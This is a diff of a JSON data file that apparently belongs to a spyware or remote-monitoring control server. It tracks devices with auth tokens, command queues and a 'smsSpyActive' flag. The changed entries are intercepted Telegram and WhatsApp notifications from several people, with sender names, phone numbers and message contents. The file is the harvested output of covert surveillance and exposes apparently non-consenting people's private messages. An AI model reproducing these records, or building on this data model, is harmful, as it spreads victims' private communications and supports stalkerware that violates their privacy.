@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776783065538,
+    "lastSeen": 1776783068365,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10404,6 +10404,38 @@
     "smsSpyActive": true,
     "smsMessages": [
       {
+        "appName": "Telegram",
+        "sender": "BOT GACHA ITEM VIP",
+        "content": "💥 Kode Redeem Digunakan!\n━━━━━━━━━━━━━━━━━━━━━━\n🎟️ Kode: N3URVOJI\n👤 Pengguna: @ALDYLOHYA\n💎 Bonus: +1 Extra Gacha\n🕒 Waktu: 21/4/2026, 14.46.10\n━━━━━━━━━━━━━━━━━━━━━━\nKode ini sekarang SUDAH DI AMBIL KUDA AIR.",
+        "time": "21/04 21:51",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776783068866
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Google, Gmail, Youtube\n• Negara: Indonesia 🇮🇩\n• Server: Server (2)\n• Nomor: +62 8**********07\n• Waktu: 21/04/2026, 21.46",
+        "time": "21/04 21:51",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776783068667
+      },
+      {
+        "appName": "Telegram",
+        "sender": "uno hoftboys",
+        "content": "INFO JOIN MY PARTNER BENEFIT BEJIBUN ADA FUNCTION PRIVATE DAN LAIN LAIN MINAT? PV @nvxzvh",
+        "time": "21/04 21:51",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776783068617
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16764 pesan baru dari 114 obrolan",
+        "time": "21/04 21:51",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776783068574
+      },
+      {
         "appName": "WhatsApp",
         "sender": "+62 896-7342-6335",
         "content": "dari pengaturan?",
@@ -14370,38 +14402,6 @@
         "time": "21/04 21:28",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776781710168
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 21:28",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776781710128
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 21:28",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776781709996
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 21:28",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776781709884
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 21:28",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776781709863
       }
     ],
     "galleryPhotos": [],
@@ -16704,6 +16704,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Azizan 7.3",
+        "content": "Cup",
+        "time": "21/04 21:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776783067772
+      },
       {
         "appName": "WhatsApp",
         "sender": "Azizan 7.3",
